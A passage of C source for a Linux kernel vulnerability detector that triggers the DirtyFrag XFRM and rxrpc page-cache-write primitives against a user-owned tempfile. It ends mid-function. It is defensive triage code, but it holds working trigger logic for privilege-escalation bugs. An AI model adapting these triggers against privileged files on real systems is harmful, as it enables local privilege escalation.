/*
 * dirtyfrag_probe — non-exploitative detector for CVE-2026-31431 (DirtyFrag).
 *
 * Background
 * ----------
 * "DirtyFrag" is a class of Linux kernel bugs where a network code path
 * pulls splice'd page-cache pages directly into its in-place crypto/AAD
 * routines, then writes the post-processed bytes back into those same
 * pages.  The result is a Dirty-Pipe-style mutation of read-only page
 * cache contents — usable as an LPE primitive when the spliced file is a
 * privileged binary (/usr/bin/su) or text file (/etc/passwd).
 *
 * Two distinct primitives are publicly known and chained in V4bel/dirtyfrag:
 *
 *   1) XFRM/espinudp ESN seq_hi write
 *        Kernel ESP-in-UDP processing on an XFRM SA configured with
 *        XFRM_STATE_ESN writes the SA's seq_hi value back into the
 *        spliced page (the user-controlled seq_hi becomes 4 bytes of
 *        attacker-chosen data at the splice offset).
 *
 *   2) rxrpc/rxkad pcbc(fcrypt) in-place decrypt
 *        rxkad_verify_packet_1() does an in-place pcbc(fcrypt) 8-byte
 *        decrypt with iv=0 over the spliced page-cache page.  The kernel
 *        treats the page as a normal sk_buff payload and writes the
 *        decrypted plaintext back, mutating the page cache.
 *
 * What this tool does (and does NOT do)
 * --------------------------------------
 * It exercises both vulnerable code paths against a tempfile that the
 * invoking user owns (created with mkstemp() under /tmp, pre-filled with
 * a single-byte sentinel), then compares the post-trigger page-cache
 * contents against the sentinel.
 *
 *   No setuid binary is opened, modified, or referenced.
 *   No /etc/passwd write, no shell ELF, no shellcode at all.
 *   The session key used in the rxkad probe is fixed; no userland
 *      brute-force loop and no usable plaintext is searched for.
 *   Cleanup: the tempfile's page cache is dropped via posix_fadvise
 *      (POSIX_FADV_DONTNEED) before unlink(), so any dirty cache
 *      mutation does NOT propagate back to disk.
 *
 * The detector confirms only one thing per primitive: did the kernel
 * write into the page cache backing a region we splice'd into the
 * relevant socket type?  That answer is sufficient for vulnerability
 * triage; it is not a working exploit and cannot be turned into one
 * without re-introducing the privileged target, the brute force, and a
 * payload that this file deliberately omits.
 *
 * Build:
 *   gcc -O2 -Wall -Wextra -o dirtyfrag_probe poc_no_exp.c
 *
 * Run (any unprivileged user; needs unprivileged user namespaces):
 *   ./dirtyfrag_probe              # both probes
 *   ./dirtyfrag_probe --xfrm-only
 *   ./dirtyfrag_probe --rxrpc-only
 *   ./dirtyfrag_probe -v           # verbose
 *
 * Exit codes:
 *   0   NOT_VULNERABLE — every probe either ran end-to-end without
 *       mutating the page cache, OR found the vulnerable primitive
 *       surface unreachable (module blocked / feature absent)
 *   1   VULNERABLE — at least one probe observed a page-cache mutation
 *   2   ERROR / INCONCLUSIVE — usage error, fatal setup failure, or at
 *       least one selected probe could not be run end-to-end for an
 *       unclear reason (e.g. AppArmor blocked uid_map)
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <stdarg.h>
#include <stdbool.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <time.h>
#include <sched.h>
#include <poll.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <net/if.h>
#include <linux/if.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
#include <linux/xfrm.h>
#include <linux/keyctl.h>
#include <linux/rxrpc.h>
#include <linux/if_alg.h>

#ifndef UDP_ENCAP
#define UDP_ENCAP 100
#endif
#ifndef UDP_ENCAP_ESPINUDP
#define UDP_ENCAP_ESPINUDP 2
#endif
#ifndef SOL_UDP
#define SOL_UDP 17
#endif
#ifndef AF_RXRPC
#define AF_RXRPC 33
#endif
#ifndef PF_RXRPC
#define PF_RXRPC AF_RXRPC
#endif
#ifndef SOL_RXRPC
#define SOL_RXRPC 272
#endif
#ifndef SOL_ALG
#define SOL_ALG 279
#endif
#ifndef AF_ALG
#define AF_ALG 38
#endif

/* ---- rxrpc / rxkad wire constants ---- */
#define RXRPC_PACKET_TYPE_DATA          1
#define RXRPC_PACKET_TYPE_CHALLENGE     6
#define RXRPC_LAST_PACKET               0x04
#define RXRPC_CHANNELMASK               3
#define RXRPC_CIDSHIFT                  2

struct rxrpc_wire_header {
	uint32_t epoch;
	uint32_t cid;
	uint32_t callNumber;
	uint32_t seq;
	uint32_t serial;
	uint8_t  type;
	uint8_t  flags;
	uint8_t  userStatus;
	uint8_t  securityIndex;
	uint16_t cksum;        /* big-endian on wire */
	uint16_t serviceId;
} __attribute__((packed));

struct rxkad_challenge {
	uint32_t version;
	uint32_t nonce;
	uint32_t min_level;
	uint32_t __padding;
} __attribute__((packed));

/* ---- options + global state ---- */
static int  g_verbose    = 0;
static int  g_run_xfrm   = 1;
static int  g_run_rxrpc  = 1;
static int  g_no_cleanup = 0;

#define LOG(fmt, ...)  do { if (g_verbose) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__); } while (0)
#define WARN(fmt, ...) do { if (g_verbose) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__); } while (0)

/* Per-probe verdict.
 *   VULNERABLE     — probe ran end-to-end, page cache mutated.
 *   NOT_VULNERABLE — probe ran end-to-end, page cache unchanged
 *                    (kernel-side fix in place).
 *   UNREACHABLE    — the kernel feature or module needed by the probe
 *                    is absent (e.g. modprobe install /bin/false on
 *                    esp4/rxrpc, or kernel built without CONFIG_XFRM /
 *                    CONFIG_RXRPC).  Host cannot be exploited via this
 *                    primitive in its current state.
 *   INCONCLUSIVE   — probe could not be run end-to-end for an unclear
 *                    reason (AppArmor blocked uid_map, handshake
 *                    timeout, transient setup failure, etc.). */
typedef enum {
	V_INCONCLUSIVE   = 0,
	V_NOT_VULNERABLE = 1,
	V_VULNERABLE     = 2,
	V_UNREACHABLE    = 3,
} verdict_t;

static const char *verdict_str(verdict_t v) {
	switch (v) {
	case V_VULNERABLE:     return "VULNERABLE";
	case V_NOT_VULNERABLE: return "NOT_VULNERABLE";
	case V_UNREACHABLE:    return "UNREACHABLE";
	default:               return "INCONCLUSIVE";
	}
}

/* ===================================================================
 * common: userns/netns setup, tempfile probe target
 * =================================================================== */

static int write_proc(const char *path, const char *fmt, ...)
{
	int fd = open(path, O_WRONLY);
	if (fd < 0) return -1;
	char buf[256]; va_list ap; va_start(ap, fmt);
	int n = vsnprintf(buf, sizeof(buf), fmt, ap); va_end(ap);
	int r = (int)write(fd, buf, n); close(fd);
	return r;
}

static int unshare_userns_netns(void)
{
	uid_t uid = getuid();
	gid_t gid = getgid();
	if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) {
		WARN("unshare(NEWUSER|NEWNET): %s", strerror(errno));
		return -1;
	}
	write_proc("/proc/self/setgroups", "deny");
	if (write_proc("/proc/self/uid_map", "0 %u 1", uid) < 0) {
		WARN("uid_map: %s", strerror(errno)); return -1;
	}
	if (write_proc("/proc/self/gid_map", "0 %u 1", gid) < 0) {
		WARN("gid_map: %s", strerror(errno)); return -1;
	}
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s >= 0) {
		struct ifreq ifr; memset(&ifr, 0, sizeof(ifr));
		strncpy(ifr.ifr_name, "lo", IFNAMSIZ);
		if (ioctl(s, SIOCGIFFLAGS, &ifr) == 0) {
			ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
			ioctl(s, SIOCSIFFLAGS, &ifr);
		}
		close(s);
	}
	LOG("entered new user+net namespace");
	return 0;
}

/* The sentinel byte we fill the probe file with.  Any post-probe byte
 * that differs is evidence the kernel mutated the page cache. */
#define SENTINEL_BYTE 0xAA
#define PROBE_FILE_LEN 4096

static int make_probe_file(char *path_out, size_t path_cap)
{
	if (path_cap < 32) { errno = EINVAL; return -1; }
	strncpy(path_out, "/tmp/dirtyfrag_probe.XXXXXX", path_cap - 1);
	path_out[path_cap - 1] = 0;
	int fd = mkstemp(path_out);
	if (fd < 0) { WARN("mkstemp: %s", strerror(errno)); return -1; }
	uint8_t buf[PROBE_FILE_LEN];
	memset(buf, SENTINEL_BYTE, sizeof(buf));
	if (write(fd, buf, sizeof(buf)) != (ssize_t)sizeof(buf)) {
		WARN("probe write: %s", strerror(errno));
		close(fd); unlink(path_out); return -1;
	}
	fsync(fd);
	close(fd);
	LOG("probe file: %s (%d B sentinel 0x%02x)",
			path_out, PROBE_FILE_LEN, SENTINEL_BYTE);
	return 0;
}

/* Open a fresh fd and read len bytes at offset.  We deliberately
 * re-open every time so we observe whatever the page cache currently
 * holds, not data cached on a long-lived fd. */
static int reread(const char *path, off_t off, void *buf, size_t len)
{
	int fd = open(path, O_RDONLY);
	if (fd < 0) return -1;
	ssize_t n = pread(fd, buf, len, off);
	close(fd);
	return (n == (ssize_t)len) ? 0 : -1;
}

static void drop_and_unlink(const char *path)
{
	if (g_no_cleanup) {
		LOG("--no-cleanup: leaving %s in place", path);
		return;
	}
	int fd = open(path, O_RDONLY);
	if (fd >= 0) {
		/* Drop any dirty page-cache pages so the kernel does NOT
		 * write our mutated data back to /tmp. */
		posix_fadvise(fd, 0, 0, POSIX_FADV_DONTNEED);
		close(fd);
	}
	unlink(path);
}

/* ===================================================================
 * probe 1: XFRM/espinudp ESN seq_hi write
 * =================================================================== */

#define XFRM_MARKER       0xCAFEBABEu      /* attacker-chosen seq_hi */
#define XFRM_MARKER_SPI   0xDEAD0001u
#define XFRM_PORT         4500
#define XFRM_SEQ_VAL      200
#define XFRM_REPLAY_SEQ   100

static void put_attr(struct nlmsghdr *nlh, int type, const void *data, size_t len)
{
	struct rtattr *rta = (struct rtattr *)((char *)nlh + NLMSG_ALIGN(nlh->nlmsg_len));
	rta->rta_type = type;
	rta->rta_len  = RTA_LENGTH(len);
	memcpy(RTA_DATA(rta), data, len);
	nlh->nlmsg_len = NLMSG_ALIGN(nlh->nlmsg_len) + RTA_ALIGN(rta->rta_len);
}

/* Install one ESN XFRM SA whose seq_hi field carries XFRM_MARKER.  If
 * the kernel is vulnerable, this seq_hi byte-pattern is what gets
 * written into the spliced page. */
/* Returns 0 on success, -1 on transient/unclear failure (=> INCONCLUSIVE),
 * -2 if the kernel reported the SA could not be constructed at all
 * (=> UNREACHABLE: esp4 module blocked, CONFIG_XFRM=n, or similar). */
static int install_xfrm_sa(uint32_t spi, uint32_t seqhi)
{
	int sk = socket(AF_NETLINK, SOCK_RAW, NETLINK_XFRM);
	if (sk < 0) {
		WARN("socket(NETLINK_XFRM): %s", strerror(errno));
		/* netlink-XFRM itself missing => primitive surface unreachable */
		if (errno == EAFNOSUPPORT || errno == EPROTONOSUPPORT)
			return -2;
		return -1;
	}
	struct sockaddr_nl nl = { .nl_family = AF_NETLINK };
	if (bind(sk, (struct sockaddr*)&nl, sizeof(nl)) < 0) { close(sk); return -1; }

	char buf[4096] = {0};
	struct nlmsghdr *nlh = (struct nlmsghdr *)buf;
	nlh->nlmsg_type  = XFRM_MSG_NEWSA;
	nlh->nlmsg_flags = NLM_F_REQUEST | NLM_F_ACK;
	nlh->nlmsg_pid   = getpid();
	nlh->nlmsg_seq   = 1;
	nlh->nlmsg_len   = NLMSG_LENGTH(sizeof(struct xfrm_usersa_info));

	struct xfrm_usersa_info *xs = (struct xfrm_usersa_info *)NLMSG_DATA(nlh);
	xs->id.daddr.a4 = inet_addr("127.0.0.1");
	xs->id.spi      = htonl(spi);
	xs->id.proto    = IPPROTO_ESP;
	xs->saddr.a4    = inet_addr("127.0.0.1");
	xs->family      = AF_INET;
	xs->mode        = XFRM_MODE_TRANSPORT;
	xs->replay_window = 0;
	xs->reqid       = 0x1234;
	xs->flags       = XFRM_STATE_ESN;
	xs->lft.soft_byte_limit   = (uint64_t)-1;
	xs->lft.hard_byte_limit   = (uint64_t)-1;
	xs->lft.soft_packet_limit = (uint64_t)-1;
	xs->lft.hard_packet_limit = (uint64_t)-1;
	xs->sel.family  = AF_INET;
	xs->sel.prefixlen_d = 32;
	xs->sel.prefixlen_s = 32;
	xs->sel.daddr.a4 = inet_addr("127.0.0.1");
	xs->sel.saddr.a4 = inet_addr("127.0.0.1");

	{
		char alg_buf[sizeof(struct xfrm_algo_auth) + 32];
		memset(alg_buf, 0, sizeof(alg_buf));
		struct xfrm_algo_auth *aa = (struct xfrm_algo_auth *)alg_buf;
		strncpy(aa->alg_name, "hmac(sha256)", sizeof(aa->alg_name)-1);
		aa->alg_key_len   = 32 * 8;
		aa->alg_trunc_len = 128;
		memset(aa->alg_key, 0xAA, 32);
		put_attr(nlh, XFRMA_ALG_AUTH_TRUNC, alg_buf, sizeof(alg_buf));
	}
	{
		char alg_buf[sizeof(struct xfrm_algo) + 16];
		memset(alg_buf, 0, sizeof(alg_buf));
		struct xfrm_algo *ea = (struct xfrm_algo *)alg_buf;
		strncpy(ea->alg_name, "cbc(aes)", sizeof(ea->alg_name)-1);
		ea->alg_key_len = 16 * 8;
		memset(ea->alg_key, 0xBB, 16);
		put_attr(nlh, XFRMA_ALG_CRYPT, alg_buf, sizeof(alg_buf));
	}
	{
		struct xfrm_encap_tmpl enc;
		memset(&enc, 0, sizeof(enc));
		enc.encap_type  = UDP_ENCAP_ESPINUDP;
		enc.encap_sport = htons(XFRM_PORT);
		enc.encap_dport = htons(XFRM_PORT);
		enc.encap_oa.a4 = 0;
		put_attr(nlh, XFRMA_ENCAP, &enc, sizeof(enc));
	}
	{
		char esn_buf[sizeof(struct xfrm_replay_state_esn) + 4];
		memset(esn_buf, 0, sizeof(esn_buf));
		struct xfrm_replay_state_esn *esn =
			(struct xfrm_replay_state_esn *)esn_buf;
		esn->bmp_len       = 1;
		esn->oseq          = 0;
		esn->seq           = XFRM_REPLAY_SEQ;
		esn->oseq_hi       = 0;
		esn->seq_hi        = seqhi;
		esn->replay_window = 32;
		put_attr(nlh, XFRMA_REPLAY_ESN_VAL, esn_buf, sizeof(esn_buf));
	}

	if (send(sk, nlh, nlh->nlmsg_len, 0) < 0) {
		WARN("XFRM netlink send: %s", strerror(errno));
		close(sk); return -1;
	}
	char rbuf[4096];
	int n = recv(sk, rbuf, sizeof(rbuf), 0);
	close(sk);
	if (n < 0) { WARN("XFRM netlink recv: %s", strerror(errno)); return -1; }
	struct nlmsghdr *rh = (struct nlmsghdr *)rbuf;
	if (rh->nlmsg_type == NLMSG_ERROR) {
		struct nlmsgerr *e = NLMSG_DATA(rh);
		if (e->error) {
			int eno = -e->error;
			WARN("XFRM NEWSA error: %s", strerror(eno));
			errno = eno;
			/* These errnos mean the kernel cannot construct an ESP SA
			 * at all in its current state (esp4/esp6 modules blocked,
			 * proto handler unavailable) — surface unreachable. */
			if (eno == EPROTONOSUPPORT || eno == EAFNOSUPPORT ||
				eno == EOPNOTSUPP     || eno == ENOPROTOOPT)
				return -2;
			return -1;
		}
	}
	return 0;
}

/* Splice 4 bytes from the probe file at `offset` into the espinudp
 * socket queue.  Vulnerable kernels write the SA's seq_hi back into the
 * page-cache page that backed those 4 bytes. */
static int xfrm_splice_trigger(const char *path, off_t offset, uint32_t spi)
{
	int sk_recv = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_recv < 0) return -1;
	int one = 1;
	setsockopt(sk_recv, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
	struct sockaddr_in sa_d = {
		.sin_family = AF_INET,
		.sin_port   = htons(XFRM_PORT),
		.sin_addr   = { inet_addr("127.0.0.1") },
	};
	if (bind(sk_recv, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
		WARN("espinudp bind :%u: %s", XFRM_PORT, strerror(errno));
		close(sk_recv); return -1;
	}
	int encap = UDP_ENCAP_ESPINUDP;
	if (setsockopt(sk_recv, IPPROTO_UDP, UDP_ENCAP, &encap, sizeof(encap)) < 0) {
		WARN("UDP_ENCAP_ESPINUDP: %s", strerror(errno));
		close(sk_recv); return -1;
	}
	int sk_send = socket(AF_INET, SOCK_DGRAM, 0);
	if (sk_send < 0) { close(sk_recv); return -1; }
	if (connect(sk_send, (struct sockaddr*)&sa_d, sizeof(sa_d)) < 0) {
		close(sk_send); close(sk_recv); return -1;
	}
	int file_fd = open(path, O_RDONLY);
	if (file_fd < 0) { close(sk_send); close(sk_recv); return -1; }
	int pfd[2];
	if (pipe(pfd) < 0) { close(file_fd); close(sk_send); close(sk_recv); return -1; }

	uint8_t hdr[24];
	*(uint32_t*)(hdr + 0) = htonl(spi);
	*(uint32_t*)(hdr + 4) = htonl(XFRM_SEQ_VAL);
	memset(hdr + 8, 0xCC, 16);

	struct iovec iov_h = { .iov_base = hdr, .iov_len = sizeof(hdr) };
	if (vmsplice(pfd[1], &iov_h, 1, 0) != (ssize_t)sizeof(hdr)) {
		close(file_fd); close(pfd[0]); close(pfd[1]);
		close(sk_send); close(sk_recv); return -1;
	}
	off_t off = offset;
	ssize_t s = splice(file_fd, &off, pfd[1], NULL, 16, SPLICE_F_MOVE);
	if (s != 16) {
		close(file_fd); close(pfd[0]); close(pfd[1]);
		close(sk_send); close(sk_recv); return -1;
	}
	(void)splice(pfd[0], NULL, sk_send, NULL, 24 + 16, SPLICE_F_MOVE);
	usleep(150 * 1000);

	close(file_fd); close(pfd[0]); close(pfd[1]);
	close(sk_send); close(sk_recv);
	return 0;
}

static verdict_t probe_xfrm(const char *path)
{
	const off_t splice_off = 0;

	int sa_rc = install_xfrm_sa(XFRM_MARKER_SPI, XFRM_MARKER);
	if (sa_rc == -2) {
		LOG("XFRM: kernel cannot construct ESP SA — surface unreachable "
				"(esp4 blocked, CONFIG_XFRM=n, or similar)");
		return V_UNREACHABLE;
	}
	if (sa_rc < 0) {
		LOG("XFRM: SA install failed for an unclear reason — inconclusive");
		return V_INCONCLUSIVE;
	}
	LOG("XFRM: ESN SA installed (spi=0x%08x seqhi=0x%08x)",
			XFRM_MARKER_SPI, XFRM_MARKER);

	if (xfrm_splice_trigger(path, splice_off, XFRM_MARKER_SPI) < 0) {
		LOG("XFRM: trigger splice failed — inconclusive");
		return V_INCONCLUSIVE;
	}
	LOG("XFRM: trigger delivered, re-reading probe file");

	uint8_t got[4];
	if (reread(path, splice_off, got, sizeof(got)) < 0) {
		LOG("XFRM: reread failed — inconclusive");
		return V_INCONCLUSIVE;
	}

	uint8_t expected_sentinel[4] = { SENTINEL_BYTE, SENTINEL_BYTE,
		SENTINEL_BYTE, SENTINEL_BYTE };
	uint8_t expected_marker[4] = {
		(XFRM_MARKER >> 24) & 0xff, (XFRM_MARKER >> 16) & 0xff,
		(XFRM_MARKER >>  8) & 0xff, (XFRM_MARKER      ) & 0xff,
	};
	LOG("XFRM: bytes at off 0 = %02x %02x %02x %02x (sentinel %02x, marker %02x %02x %02x %02x)",
			got[0], got[1], got[2], got[3], SENTINEL_BYTE,
			expected_marker[0], expected_marker[1],
			expected_marker[2], expected_marker[3]);

	if (memcmp(got, expected_marker, 4) == 0)
		return V_VULNERABLE;
	if (memcmp(got, expected_sentinel, 4) == 0)
		return V_NOT_VULNERABLE;
	/* Bytes mutated but not to the expected marker — still indicates
	 * the kernel performed an unexpected page-cache write. */
	return V_VULNERABLE;
}

/* ===================================================================
 * probe 2: rxrpc/rxkad pcbc(fcrypt) in-place decrypt
 * =================================================================== */

/* Fixed session key.  We do NOT search for one that produces a useful
 * plaintext — we only need to know whether the kernel performed the
 * in-place decrypt at all. */
static const uint8_t RXKAD_SESSION_KEY[8] = {
	0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08
};

static long key_add(const char *type, const char *desc,
		const void *payload, size_t plen, int ringid)
{
	return syscall(SYS_add_key, type, desc, payload, plen, ringid);
}

static int build_rxrpc_v1_token(uint8_t *out, size_t maxlen)
{
	uint8_t *p = out;
	uint32_t now = (uint32_t)time(NULL);
	uint32_t expires = now + 86400;
	*(uint32_t *)p = htonl(0); p += 4;
	const char *cell = "probe";
	uint32_t clen = strlen(cell);
	*(uint32_t *)p = htonl(clen); p += 4;
	memcpy(p, cell, clen);
	uint32_t pad = (4 - (clen & 3)) & 3;
	memset(p + clen, 0, pad);
	p += clen + pad;
	*(uint32_t *)p = htonl(1); p += 4;
	uint8_t *toklen_p = p; p += 4;
	uint8_t *tokstart = p;
	*(uint32_t *)p = htonl(2); p += 4;            /* sec_ix = RXKAD */
	*(uint32_t *)p = htonl(0); p += 4;            /* vice_id */
	*(uint32_t *)p = htonl(1); p += 4;            /* kvno */
	memcpy(p, RXKAD_SESSION_KEY, 8); p += 8;
	*(uint32_t *)p = htonl(now); p += 4;
	*(uint32_t *)p = htonl(expires); p += 4;
	*(uint32_t *)p = htonl(1); p += 4;            /* primary_flag */
	*(uint32_t *)p = htonl(8); p += 4;            /* ticket_len */
	memset(p, 0xCC, 8); p += 8;
	uint32_t toklen = (uint32_t)(p - tokstart);
	*(uint32_t *)toklen_p = htonl(toklen);
	if ((size_t)(p - out) > maxlen) { errno = E2BIG; return -1; }
	return (int)(p - out);
}

static long add_rxrpc_key(const char *desc)
{
	uint8_t buf[512];
	int n = build_rxrpc_v1_token(buf, sizeof(buf));
	if (n < 0) return -1;
	return key_add("rxrpc", desc, buf, n, KEY_SPEC_PROCESS_KEYRING);
}

/* AF_ALG pcbc(fcrypt) — userland mirror of the kernel's per-packet
 * crypto, used here only to construct a wire checksum the kernel will
 * accept. */
static int alg_open_pcbc_fcrypt(const uint8_t key[8])
{
	int s = socket(AF_ALG, SOCK_SEQPACKET, 0);
	if (s < 0) return -1;
	struct sockaddr_alg sa = { .salg_family = AF_ALG };
	strcpy((char *)sa.salg_type, "skcipher");
	strcpy((char *)sa.salg_name, "pcbc(fcrypt)");
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(s); return -1; }
	if (setsockopt(s, SOL_ALG, ALG_SET_KEY, key, 8) < 0) { close(s); return -1; }
	return s;
}

static int alg_op(int alg_s, int op, const uint8_t iv[8],
		const void *in, size_t inlen, void *out)
{
	int op_fd = accept(alg_s, NULL, NULL);
	if (op_fd < 0) return -1;
	char cbuf[CMSG_SPACE(sizeof(int)) +
		CMSG_SPACE(sizeof(struct af_alg_iv) + 8)] = {0};
	struct msghdr msg = {0};
	msg.msg_control = cbuf;
	msg.msg_controllen = sizeof(cbuf);
	struct cmsghdr *c = CMSG_FIRSTHDR(&msg);
	c->cmsg_level = SOL_ALG;
	c->cmsg_type = ALG_SET_OP;
	c->cmsg_len = CMSG_LEN(sizeof(int));
	*(int *)CMSG_DATA(c) = op;
	c = CMSG_NXTHDR(&msg, c);
	c->cmsg_level = SOL_ALG;
	c->cmsg_type = ALG_SET_IV;
	c->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + 8);
	struct af_alg_iv *aiv = (struct af_alg_iv *)CMSG_DATA(c);
	aiv->ivlen = 8;
	memcpy(aiv->iv, iv, 8);
	struct iovec iov = { .iov_base = (void *)in, .iov_len = inlen };
	msg.msg_iov = &iov; msg.msg_iovlen = 1;
	if (sendmsg(op_fd, &msg, 0) < 0) { close(op_fd); return -1; }
	ssize_t n = read(op_fd, out, inlen);
	close(op_fd);
	return (n == (ssize_t)inlen) ? 0 : -1;
}

static int compute_csum_iv(uint32_t epoch, uint32_t cid, uint32_t sec_ix,
		const uint8_t key[8], uint8_t csum_iv[8])
{
	int s = alg_open_pcbc_fcrypt(key);
	if (s < 0) return -1;
	uint32_t in[4]  = { htonl(epoch), htonl(cid), 0, htonl(sec_ix) };
	uint8_t  out[16];
	int rc = alg_op(s, ALG_OP_ENCRYPT, key, in, 16, out);
	close(s);
	if (rc < 0) return -1;
	memcpy(csum_iv, out + 8, 8);
	return 0;
}

static int compute_cksum(uint32_t cid, uint32_t call_id, uint32_t seq,
		const uint8_t key[8], const uint8_t csum_iv[8],
		uint16_t *cksum_out)
{
	int s = alg_open_pcbc_fcrypt(key);
	if (s < 0) return -1;
	uint32_t x = (cid & RXRPC_CHANNELMASK) << (32 - RXRPC_CIDSHIFT);
	x |= seq & 0x3fffffff;
	uint32_t in[2] = { htonl(call_id), htonl(x) };
	uint32_t out[2];
	int rc = alg_op(s, ALG_OP_ENCRYPT, csum_iv, in, 8, out);
	close(s);
	if (rc < 0) return -1;
	uint32_t y = ntohl(out[1]);
	uint16_t v = (y >> 16) & 0xffff;
	if (v == 0) v = 1;
	*cksum_out = v;
	return 0;
}

static int setup_rxrpc_client(uint16_t local_port, const char *keyname)
{
	int fd = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
	if (fd < 0) return -1;
	if (setsockopt(fd, SOL_RXRPC, RXRPC_SECURITY_KEY,
				keyname, strlen(keyname)) < 0) { close(fd); return -1; }
	int min_level = RXRPC_SECURITY_AUTH;
	if (setsockopt(fd, SOL_RXRPC, RXRPC_MIN_SECURITY_LEVEL,
				&min_level, sizeof(min_level)) < 0) { close(fd); return -1; }
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = 0;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(local_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(fd, (struct sockaddr *)&srx, sizeof(srx)) < 0) {
		close(fd); return -1;
	}
	return fd;
}

static int rxrpc_client_initiate_call(int cli_fd, uint16_t srv_port,
		uint16_t service_id, unsigned long user_call_id)
{
	char data[8] = "PINGPING";
	struct sockaddr_rxrpc srx = {0};
	srx.srx_family = AF_RXRPC;
	srx.srx_service = service_id;
	srx.transport_type = SOCK_DGRAM;
	srx.transport_len = sizeof(struct sockaddr_in);
	srx.transport.sin.sin_family = AF_INET;
	srx.transport.sin.sin_port = htons(srv_port);
	srx.transport.sin.sin_addr.s_addr = htonl(0x7F000001);
	char cmsg_buf[CMSG_SPACE(sizeof(unsigned long))];
	struct msghdr msg = {0};
	msg.msg_name = &srx; msg.msg_namelen = sizeof(srx);
	struct iovec iov = { .iov_base = data, .iov_len = sizeof(data) };
	msg.msg_iov = &iov; msg.msg_iovlen = 1;
	msg.msg_control = cmsg_buf; msg.msg_controllen = sizeof(cmsg_buf);
	struct cmsghdr *cmsg = CMSG_FIRSTHDR(&msg);
	cmsg->cmsg_level = SOL_RXRPC;
	cmsg->cmsg_type = RXRPC_USER_CALL_ID;
	cmsg->cmsg_len = CMSG_LEN(sizeof(unsigned long));
	*(unsigned long *)CMSG_DATA(cmsg) = user_call_id;
	int fl = fcntl(cli_fd, F_GETFL);
	fcntl(cli_fd, F_SETFL, fl | O_NONBLOCK);
	ssize_t n = sendmsg(cli_fd, &msg, 0);
	fcntl(cli_fd, F_SETFL, fl);
	if (n < 0 && errno != EAGAIN && errno != EWOULDBLOCK) return -1;
	return 0;
}

static int setup_udp_server(uint16_t port)
{
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) return -1;
	struct sockaddr_in sa = {0};
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) { close(s); return -1; }
	return s;
}

static ssize_t udp_recv_to(int s, void *buf, size_t cap,
		struct sockaddr_in *from, int timeout_ms)
{
	struct pollfd pfd = { .fd = s, .events = POLLIN };
	int rc = poll(&pfd, 1, timeout_ms);
	if (rc <= 0) return -1;
	socklen_t fl = from ? sizeof(*from) : 0;
	return recvfrom(s, buf, cap, 0,
			(struct sockaddr *)from, from ? &fl : NULL);
}

/* Single rxkad trigger.  Splice 8 bytes from the probe file into the
 * malicious DATA packet and let the kernel's verify_packet path do its
 * in-place decrypt. */
static int rxrpc_one_trigger(int target_fd, off_t splice_off, size_t splice_len,
		uint16_t port_S, uint16_t port_C, uint16_t svc_id,
		const char *keyname)
{
	long key = add_rxrpc_key(keyname);
	if (key < 0) { WARN("add_key(rxrpc): %s", strerror(errno)); return -1; }

	int udp_srv = setup_udp_server(port_S);
	if (udp_srv < 0) {
		syscall(SYS_keyctl, KEYCTL_INVALIDATE, key); return -1;
	}
	int rxsk_cli = setup_rxrpc_client(port_C, keyname);
	if (rxsk_cli < 0) {
		close(udp_srv); syscall(SYS_keyctl, KEYCTL_INVALIDATE, key);
		return -1;
	}
	if (rxrpc_client_initiate_call(rxsk_cli, port_S, svc_id, 0xDEAD) < 0) {
		close(rxsk_cli); close(udp_srv);
		syscall(SYS_keyctl, KEYCTL_INVALIDATE, key); return -1;
	}

	uint8_t pkt[2048];
	struct sockaddr_in cli_addr;
	ssize_t n = udp_recv_to(udp_srv, pkt, sizeof(pkt), &cli_addr, 1500);
	if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) {
		WARN("rxrpc: no client handshake within 1.5s");
		close(rxsk_cli); close(udp_srv);
		syscall(SYS_keyctl, KEYCTL_INVALIDATE, key); return -1;
	}
	struct rxrpc_wire_header *whdr_in = (struct rxrpc_wire_header *)pkt;
	uint32_t epoch  = ntohl(whdr_in->epoch);
	uint32_t cid    = ntohl(whdr_in->cid);
	uint32_t callN  = ntohl(whdr_in->callNumber);
	uint16_t svc_in = ntohs(whdr_in->serviceId);
	uint16_t cli_port = ntohs(cli_addr.sin_port);

	{
		struct {
			struct rxrpc_wire_header hdr;
			struct rxkad_challenge   ch;
		} __attribute__((packed)) c = {0};
		c.hdr.epoch = htonl(epoch);
		c.hdr.cid = htonl(cid);
		c.hdr.callNumber = 0; c.hdr.seq = 0;
		c.hdr.serial = htonl(0x10000);
		c.hdr.type = RXRPC_PACKET_TYPE_CHALLENGE;
		c.hdr.securityIndex = 2;
		c.hdr.serviceId = htons(svc_in);
		c.ch.version = htonl(2);
		c.ch.nonce = htonl(0xDEADBEEFu);
		c.ch.min_level = htonl(1);
		struct sockaddr_in to = { .sin_family=AF_INET,
			.sin_port=htons(cli_port),
